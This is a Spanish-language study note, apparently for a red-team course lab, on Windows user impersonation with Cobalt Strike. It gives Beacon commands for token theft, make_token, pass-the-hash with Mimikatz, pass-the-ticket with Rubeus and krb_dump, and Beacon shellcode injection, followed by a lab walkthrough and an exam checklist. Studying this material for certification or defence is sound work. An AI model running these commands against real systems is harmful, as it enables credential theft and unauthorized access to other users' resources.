---
title: "User Impersonation"
date: 2026-05-14 10:00:00 +0100
categories: [ZeroPointSecurity, Windows]
tags: [CS]
---

> **Objetivo:** Usar credenciales, hashes o tickets obtenidos en Credential Access para actuar como otro usuario y acceder a recursos remotos.
> **MITRE:** Use Alternate Authentication Material [T1550]

---

## Índice rápido
- [[#Contexto — sesiones de inicio de sesión y tokens]]
- [[#TÉCNICA 1 — make_token (credenciales en claro)]]
- [[#TÉCNICA 2 — steal_token (robar token de proceso)]]
- [[#TÉCNICA 3 — token-store (guardar tokens)]]
- [[#TÉCNICA 4 — Pass the Hash (pth)]]
- [[#TÉCNICA 5 — Pass the Ticket (PtT)]]
- [[#TÉCNICA 6 — Process Injection (inject)]]
- [[#Lab — Dump TGT + Pass the Ticket]]
- [[#Referencia — flujo de decisión]]
- [[#Checklist de examen]]

---

## Contexto — sesiones de inicio de sesión y tokens

> Antes de suplantar a un usuario hay que entender qué se está manipulando.

**Logon Session:** cuando un usuario se autentica, se crea una sesión con un identificador único (**LUID**). LSASS almacena las credenciales (NTLM, AES keys, tickets Kerberos) en caché para esa sesión.

**Access Token:** cada proceso recibe un token vinculado a la sesión de inicio de sesión. Windows lo consulta para tomar decisiones de acceso. Hay dos tipos:
- **Primary token** → asignado al proceso. `getuid`/`whoami` leen de aquí.
- **Impersonation token** → un thread puede suplantar una identidad diferente a la del proceso.

> **La confusión de `getuid`:** `steal_token` y `make_token` muestran el usuario real del token primario del proceso, no las credenciales alternativas inyectadas. `getuid` seguirá mostrando el usuario original — eso es normal. Lo que cambia es cómo Beacon se autentica en recursos de red.

**Regla crítica:** la suplantación afecta a recursos **remotos** (acceso a shares, autenticación Kerberos/NTLM en red). Las acciones **locales** siguen bajo el contexto del proceso original.

---

## TÉCNICA 1 — make_token (credenciales en claro)
**MITRE:** T1134.003 | **Requiere:** Cualquier integridad | **Necesitas:** Contraseña en claro

> Crea una nueva sesión de inicio de sesión con credenciales alternativas usando `LogonUserA` + `ImpersonateLoggedOnUser`. No requiere high-integrity. Solo afecta autenticación en red.

```bash
# Sintaxis: make_token [DOMAIN\user] [password]
beacon> make_token CONTOSO\rsteel Passw0rd!
# → [+] Impersonated CONTOSO\rsteel (netonly)

# Verificar que funciona accediendo a un recurso remoto
beacon> ls \\lon-ws-1\c$

# Dejar de suplantar
beacon> rev2self
```

> **(netonly)** significa que las credenciales solo se usan para autenticación en red. El proceso local sigue siendo el usuario original.

---

## TÉCNICA 2 — steal_token (robar token de proceso)
**MITRE:** T1134.001 | **Requiere:** High-Integrity | **Necesitas:** Ver un proceso del usuario objetivo corriendo

> Duplica el token primario de un proceso que ya corre como el usuario objetivo. Usa `OpenProcess → OpenProcessToken → DuplicateToken → ImpersonateLoggedOnUser`.

```bash
# 1. Encontrar el PID del proceso del usuario objetivo
beacon> ps
# Buscar proceso con el usuario deseado en la columna User

# 2. Robar el token
beacon> steal_token 5248
# → [+] Impersonated CONTOSO\rsteel

# 3. Usar recursos remotos bajo la identidad del usuario
beacon> ls \\lon-ws-1\c$

# 4. Dejar de suplantar
beacon> rev2self
```

> ⚠️ Si el proceso objetivo se cierra, pierdes la capacidad de suplantar. Usar `token-store` para evitarlo.

---

## TÉCNICA 3 — token-store (guardar tokens)
**MITRE:** T1134.001 | **Requiere:** High-Integrity

> El kernel mantiene referencias a tokens activos aunque el proceso muera. `token-store` guarda un handle al token para reutilizarlo más tarde.

```bash
# Robar el token Y guardarlo en el store
beacon> token-store steal 5248
# → ID 0 | PID 5248 | CONTOSO\rsteel

# Ver todos los tokens guardados
beacon> token-store show

# Usar un token guardado por su ID
beacon> token-store use 0
# → [+] Impersonated CONTOSO\rsteel

# Eliminar un token del store
beacon> token-store remove 0

# Dejar de suplantar (no elimina el token del store)
beacon> rev2self
```

---

## TÉCNICA 4 — Pass the Hash (PtH)
**MITRE:** T1550.002 | **Requiere:** High-Integrity / SYSTEM | **Necesitas:** Hash NTLM

> Inserta el hash NTLM directamente en la caché de credenciales de una sesión de inicio de sesión. No necesita la contraseña en claro. Sin embargo, NTLM está siendo eliminado progresivamente — puede estar restringido en entornos con alta seguridad.

### Método 1 — pth built-in de Beacon (puede ser bloqueado por Defender)

```bash
# Sintaxis: pth [DOMAIN\user] [hash_NTLM]
beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
# → wrapper de sekurlsa::pth — puede ser bloqueado por Defender
```

### Método 2 — Mimikatz manual + steal_token (más fiable)

```bash
# 1. Verificar que el acceso falla
beacon> ls \\lon-ws-1\c$
# → ERROR_ACCESS_DENIED

# 2. Usar Mimikatz para lanzar cmd.exe con las credenciales del hash
# /run:%COMSPEC% lanza cmd.exe en una nueva sesión con el hash inyectado
beacon> mimikatz sekurlsa::pth /user:rsteel /domain:CONTOSO /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC%
# → output: PID 1188  LUID 0x35d50e

# 3. Robar el token del proceso creado
beacon> steal_token 1188
# → [+] Impersonated CONTOSO\rsteel (aparece el usuario original — es normal)

# 4. Ahora el acceso funciona
beacon> ls \\lon-ws-1\c$

# 5. Limpiar
beacon> rev2self
beacon> kill 1188     # matar el proceso cmd.exe creado
```

> **Por qué `steal_token` muestra el usuario original:** `steal_token` y `getuid` leen el token primario del proceso (que sigue siendo el usuario original). Las credenciales alternativas solo afectan a la autenticación en red, no al token primario.

---

## TÉCNICA 5 — Pass the Ticket (PtT)
**MITRE:** T1550.003 | **Requiere:** High-Integrity para tickets de otros usuarios | **Necesitas:** TGT en base64 o .kirbi

> Inyecta un ticket Kerberos en una sesión de inicio de sesión. Más discreto que PtH — usa LSA APIs nativas, no modifica la memoria de LSASS, no está restringido como NTLM.

### Opción A — make_token + kerberos_ticket_use (método del lab, recomendado)

```bash
# 1. Extraer el TGT del usuario objetivo (desde Beacon SYSTEM)
beacon> krb_triage                          # ver tickets disponibles + LUIDs
beacon> krb_dump /user:rsteel /service:krbtgt   # extraer el TGT

# 2. Guardar el ticket a disco en el atacante (en la consola de CS o PowerShell)
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64_TICKET_AQUI]"))

# 3. Crear nueva sesión de inicio de sesión sacrificial (contraseña falsa — no importa)
# Esto evita sobreescribir los tickets de la sesión actual
beacon> make_token CONTOSO\rsteel FakePass
# → [+] Impersonated CONTOSO\rsteel (netonly)  ← LUID cambia a uno nuevo vacío

# 4. Inyectar el ticket en la nueva sesión
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

# 5. Verificar que el ticket está presente
beacon> run klist

# 6. Acceder al recurso remoto
beacon> ls \\lon-ws-1\c$

# 7. Limpiar

# Si quieres limpiar los tickets sin descartar la sesión:
beacon> kerberos_ticket_purge

beacon> rev2self                          # descarta la sesión sacrificial

```

### Opción B — Solicitar TGT con AES256 key + Rubeus ptt

```bash
# Si tienes la AES256 key del usuario (de sekurlsa::ekeys):
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
# → TGT en base64: doIFo[...]kNPTQ==

# Guardar a disco
$ticket = "doIFo[...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))

# Crear sesión + inyectar (mismo proceso que Opción A)
beacon> make_token CONTOSO\rsteel FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

### Opción C — Rubeus createnetonly + ptt (alternativa a make_token)

```bash
# createnetonly crea un proceso oculto en nueva sesión + devuelve PID y LUID
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
# → ProcessID: 2524  |  LUID: 0x132ef34

# Inyectar el ticket en esa sesión por LUID
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFo[...]kNPTQ==
# → [+] Ticket successfully imported!

# Robar el token del proceso creado
beacon> steal_token 2524

# Acceder al recurso
beacon> ls \\lon-ws-1\c$

# Limpiar
beacon> rev2self
beacon> kill 2524
```

---

## TÉCNICA 6 — Process Injection (inject)
**MITRE:** T1055 | **Requiere:** High-Integrity | **Resultado:** Nuevo Beacon como el usuario del proceso

> Inyecta shellcode de Beacon directamente en un proceso que ya corre como el usuario objetivo. El nuevo Beacon hereda el contexto de seguridad del proceso inyectado.

```bash
# 1. Identificar el proceso objetivo
beacon> ps
# Buscar proceso del usuario deseado

# PID   PPID  Name       Arch  Session  User
# 5248  1864  cmd.exe    x64   0        CONTOSO\rsteel

# 2. Inyectar shellcode del listener deseado
# Sintaxis: inject [pid] [x86|x64] [listener]
beacon> inject 5248 x64 http
# → nuevo Beacon aparece corriendo como CONTOSO\rsteel

# No requiere rev2self — es un proceso completamente nuevo
```

> Diferencia con `steal_token`: `inject` crea un **nuevo Beacon** en ese proceso. `steal_token` simplemente hace que el Beacon actual use el token de otro proceso para autenticación en red.

---

## Lab — Dump TGT + Pass the Ticket

> **Objetivo del lab:** listar `\\lon-ws-1\c$` como `rsteel` usando su TGT, sin conocer su contraseña.

```bash
# PASO 1 — Verificar que el acceso falla
beacon> ls \\lon-ws-1\c$
# → ACCESS_DENIED (Beacon corre como pchilds / SYSTEM, no rsteel)

# PASO 2 — Ver qué tickets hay disponibles (desde Beacon SYSTEM)
beacon> krb_triage
# Buscar: rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM → anotar el LUID

# PASO 3 — Extraer el TGT de rsteel
beacon> krb_dump /user:rsteel /service:krbtgt
# → doIFq[...]uQ09N  (ticket en base64)

# PASO 4 — Guardar el ticket a disco (en PowerShell/Terminal del atacante)
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[PEGAR_BASE64_AQUI]"))

# PASO 5 — Crear sesión sacrificial con contraseña falsa
beacon> make_token CONTOSO\rsteel FakePass
# → (netonly) — LUID cambia, la caché de tickets de esta sesión está vacía

# PASO 6 — Inyectar el ticket en la nueva sesión
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

# PASO 7 — Verificar que el ticket está en la sesión
beacon> run klist
# Debe mostrar el TGT de rsteel

# PASO 8 — Acceder al share
beacon> ls \\lon-ws-1\c$
# → debe listar el contenido del C$ de lon-ws-1

# PASO 9 — Limpiar
beacon> rev2self
```

---

## Referencia — flujo de decisión

```
¿Qué material de autenticación tienes?
│
├─ Contraseña en claro
│   └─ make_token DOMAIN\user password
│
├─ Hash NTLM
│   ├─ pth DOMAIN\user hash              (puede ser bloqueado por Defender)
│   └─ mimikatz sekurlsa::pth ... /run:%COMSPEC% → steal_token [PID] → rev2self + kill [PID]
│
├─ Ticket Kerberos (TGT base64 de Rubeus/krb_dump)
│   └─ make_token DOMAIN\user FakePass → kerberos_ticket_use rsteel.kirbi → rev2self
│
├─ AES256 key (de sekurlsa::ekeys)
│   └─ Rubeus asktgt /aes256:... → guardar ticket → make_token + kerberos_ticket_use
│
└─ Proceso del usuario ya corriendo
    ├─ steal_token [PID]     → rev2self                     (autenticación remota)
    ├─ token-store steal [PID] → token-store use [ID]       (persistente)
    └─ inject [PID] x64 [listener]                          (nuevo Beacon como ese usuario)
```

---

## Referencia — comandos de gestión de tokens y tickets

| Comando | Qué hace | Cuándo usarlo |
|---|---|---|
| `make_token DOMAIN\user pass` | Crea sesión con credenciales alternativas | Tienes contraseña en claro, o necesitas sesión vacía para PtT |
| `steal_token [PID]` | Roba token de proceso de otro usuario | Hay un proceso del usuario corriendo, tienes high-integrity |
| `token-store steal [PID]` | Roba token y lo guarda permanentemente | Quieres reutilizar el token aunque el proceso muera |
| `token-store use [ID]` | Usa token guardado del store | Reutilizar token previamente robado |
| `rev2self` | Abandona la suplantación actual | Siempre al terminar — restaura el contexto original |
| `kerberos_ticket_use [ruta.kirbi]` | Inyecta ticket en sesión actual | PtT — después de make_token |
| `kerberos_ticket_purge` | Elimina tickets de la sesión actual | Limpiar tickets sin descartar la sesión |
| `inject [PID] [arch] [listener]` | Inyecta shellcode en proceso | Nuevo Beacon como el usuario del proceso |
| `pth DOMAIN\user hash` | Pass-the-Hash built-in | PtH rápido (puede ser bloqueado) |

---

## Checklist de examen

```
ANTES DE SUPLANTAR
[ ] getuid → confirmar usuario actual
[ ] ps → buscar procesos de usuarios objetivo
[ ] Si necesitas PtT: krb_triage → identificar TGTs disponibles

MAKE_TOKEN (contraseña en claro)
[ ] beacon> make_token CONTOSO\rsteel Passw0rd!
[ ] Verificar: ls \\servidor\share
[ ] Limpiar: rev2self

STEAL_TOKEN (proceso existente — high-integrity)
[ ] beacon> ps → anotar PID del proceso del usuario
[ ] beacon> steal_token [PID]
[ ] Limpiar: rev2self

TOKEN-STORE (persistencia del token)
[ ] beacon> token-store steal [PID]
[ ] beacon> token-store show          ← ver tokens guardados
[ ] beacon> token-store use [ID]
[ ] beacon> rev2self (no elimina del store)
[ ] beacon> token-store remove [ID]   ← eliminar cuando ya no sea necesario

PASS THE HASH (hash NTLM)
[ ] Método fiable: mimikatz sekurlsa::pth /user:rsteel /domain:CONTOSO /ntlm:<hash> /run:%COMSPEC%
[ ] Anotar PID del proceso creado
[ ] beacon> steal_token [PID]
[ ] Verificar: ls \\servidor\share
[ ] Limpiar: rev2self && kill [PID]

PASS THE TICKET — LAB (TGT extraído)
[ ] beacon> krb_triage                                     ← ver tickets disponibles
[ ] beacon> krb_dump /user:rsteel /service:krbtgt          ← extraer TGT base64
[ ] [IO.File]::WriteAllBytes("C:\...\rsteel.kirbi", [Convert]::FromBase64String("[B64]"))
[ ] beacon> make_token CONTOSO\rsteel FakePass             ← sesión sacrificial vacía
[ ] beacon> kerberos_ticket_use C:\...\rsteel.kirbi        ← inyectar ticket
[ ] beacon> run klist                                      ← verificar ticket presente
[ ] beacon> ls \\lon-ws-1\c$                               ← probar acceso
[ ] Limpiar: rev2self

PASS THE TICKET — desde AES256 key
[ ] Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<key> /nowrap
[ ] Guardar ticket base64 a .kirbi
[ ] make_token + kerberos_ticket_use (igual que arriba)

PROCESS INJECTION (nuevo Beacon como otro usuario)
[ ] beacon> ps → anotar PID + arch del proceso objetivo
[ ] beacon> inject [PID] [x64|x86] [listener]
[ ] → nuevo Beacon aparece como el usuario objetivo
[ ] (no requiere rev2self — es un proceso independiente)
```

